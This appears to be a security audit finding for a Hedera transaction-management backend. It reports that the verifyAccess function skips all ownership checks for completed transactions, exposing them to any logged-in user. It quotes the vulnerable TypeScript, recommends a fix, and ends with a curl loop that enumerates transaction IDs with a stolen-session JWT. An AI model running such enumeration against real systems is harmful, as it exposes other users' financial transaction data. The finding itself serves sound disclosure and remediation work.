### Title
Any Authenticated User Can Read Any Completed Transaction Due to Unconditional `verifyAccess` Bypass for Terminal-Status Transactions

### Summary
`verifyAccess` in `transactions.service.ts` unconditionally returns `true` for any transaction whose status is terminal (EXECUTED, EXPIRED, FAILED, CANCELED, ARCHIVED), without checking whether the requesting user has any relationship to that transaction. Because `GET /transactions/:id` calls `getTransactionWithVerifiedAccess`, which delegates to `verifyAccess`, any authenticated user can retrieve the full details of any completed transaction belonging to any other user simply by guessing or enumerating integer IDs.

### Finding Description

**Root cause — `verifyAccess` skips all user checks for terminal transactions:** [1](#0-0) 

```typescript
async verifyAccess(transaction: Transaction, user: User): Promise<boolean> {
    if (!transaction) throw new BadRequestException(ErrorCodes.TNF);

    if (
      [
        TransactionStatus.EXECUTED,
        TransactionStatus.EXPIRED,
        TransactionStatus.FAILED,
        TransactionStatus.CANCELED,
        TransactionStatus.ARCHIVED,
      ].includes(transaction.status)
    )
      return true;          // ← no user check whatsoever

    const userKeysToSign = await this.userKeysToSign(transaction, user, true);

    return (
      userKeysToSign.length !== 0 ||
      transaction.creatorKey?.userId === user.id ||
      !!transaction.observers?.some(o => o.userId === user.id) ||
      !!transaction.signers?.some(s => s.userKey?.userId === user.id) ||
      !!transaction.approvers?.some(a => a.userId === user.id)
    );
  }
```

For non-terminal transactions the function correctly restricts access to the creator, assigned signers, observers, and approvers. For terminal transactions the `user` argument is ignored entirely.

**Exposed entry point — `GET /transactions/:id`:** [2](#0-1) 

```typescript
@Get('/:id')
@Serialize(TransactionFullDto)
async getTransaction(
  @GetUser() user,
  @Param('id', TransactionIdPipe) id: number | TransactionId,
): Promise<Transaction> {
  return this.transactionsService.getTransactionWithVerifiedAccess(id, user);
}
```

`getTransactionWithVerifiedAccess` calls `verifyAccess`: [3](#0-2) 

The controller is protected only by `JwtBlackListAuthGuard, JwtAuthGuard, VerifiedUserGuard` — standard authenticated-user guards, no ownership check: [4](#0-3) 

**Exploit path:**
1. Attacker registers or obtains any valid account in the organization.
2. Attacker iterates `GET /transactions/1`, `GET /transactions/2`, … `GET /transactions/N`.
3. For every transaction whose status is EXECUTED, EXPIRED, FAILED, CANCELED, or ARCHIVED, `verifyAccess` returns `true` and the full `TransactionFullDto` is returned — including `transactionBytes`, `transactionHash`, `creatorKey`, and all attached signers — regardless of whether the attacker has any relationship to that transaction.

### Impact Explanation
Any authenticated user can exfiltrate the complete history of every other user's completed Hedera transactions. The response includes raw `transactionBytes` (the full signed Hedera transaction), `transactionHash`, creator key metadata, and signer records. This constitutes cross-user data exposure of sensitive financial transaction data. In an organization where transactions carry confidential account operations (account updates, node operations, fund transfers), this leaks the full audit trail to any insider or compromised account.

### Likelihood Explanation
The attacker precondition is only a valid authenticated session — the lowest possible bar for an insider threat or a compromised low-privilege account. Transaction IDs are sequential integers, making enumeration trivial. No rate-limit or pagination restriction prevents bulk enumeration. The vulnerable code path is the primary read endpoint for transactions.

### Recommendation
Remove the unconditional early-return for terminal-status transactions in `verifyAccess`. Terminal transactions should apply the same ownership checks (creator, signer, observer, approver) as active transactions. If historical visibility for all org members is a deliberate product requirement, it must be explicitly documented and scoped — and the access model must be consistent with how non-terminal transactions are protected.

```typescript
// Remove this block entirely, or apply the same user-relationship checks:
// if ([EXECUTED, EXPIRED, FAILED, CANCELED, ARCHIVED].includes(transaction.status))
//   return true;
```

### Proof of Concept

```
# Step 1: Authenticate as any valid user
POST /auth/login
{ "email": "attacker@org.com", "password": "..." }
→ { "accessToken": "<JWT>" }

# Step 2: Enumerate completed transactions belonging to other users
for id in $(seq 1 10000); do
  curl -s -H "Authorization: Bearer <JWT>" \
    https://api.example.com/transactions/$id \
    | jq 'select(.status == "EXECUTED" or .status == "CANCELED")'
done

# Result: Full TransactionFullDto for every terminal-status transaction
# in the system, including transactionBytes, transactionHash, creatorKey,
# and signer records — regardless of whether the attacker is the creator,
# signer, observer, or approver of those transactions.
```

### Citations

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L754-763)
```typescript
  async getTransactionWithVerifiedAccess(transactionId: number | TransactionId, user: User) {
    const transaction = await this.getTransactionById(transactionId);

    await this.attachTransactionApprovers(transaction);

    if (!(await this.verifyAccess(transaction, user))) {
      throw new UnauthorizedException('You don\'t have permission to view this transaction');
    }
    return transaction;
  }
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L786-809)
```typescript
  async verifyAccess(transaction: Transaction, user: User): Promise<boolean> {
    if (!transaction) throw new BadRequestException(ErrorCodes.TNF);

    if (
      [
        TransactionStatus.EXECUTED,
        TransactionStatus.EXPIRED,
        TransactionStatus.FAILED,
        TransactionStatus.CANCELED,
        TransactionStatus.ARCHIVED,
      ].includes(transaction.status)
    )
      return true;

    const userKeysToSign = await this.userKeysToSign(transaction, user, true);

    return (
      userKeysToSign.length !== 0 ||
      transaction.creatorKey?.userId === user.id ||
      !!transaction.observers?.some(o => o.userId === user.id) ||
      !!transaction.signers?.some(s => s.userKey?.userId === user.id) ||
      !!transaction.approvers?.some(a => a.userId === user.id)
    );
  }
```

**File:** back-end/apps/api/src/transactions/transactions.controller.ts (L54-57)
```typescript
@ApiTags('Transactions')
@Controller('transactions')
@UseGuards(JwtBlackListAuthGuard, JwtAuthGuard, VerifiedUserGuard)
export class TransactionsController {
```

**File:** back-end/apps/api/src/transactions/transactions.controller.ts (L296-303)
```typescript
  @Get('/:id')
  @Serialize(TransactionFullDto)
  async getTransaction(
    @GetUser() user,
    @Param('id', TransactionIdPipe) id: number | TransactionId,
  ): Promise<Transaction> {
    return this.transactionsService.getTransactionWithVerifiedAccess(id, user);
  }
```
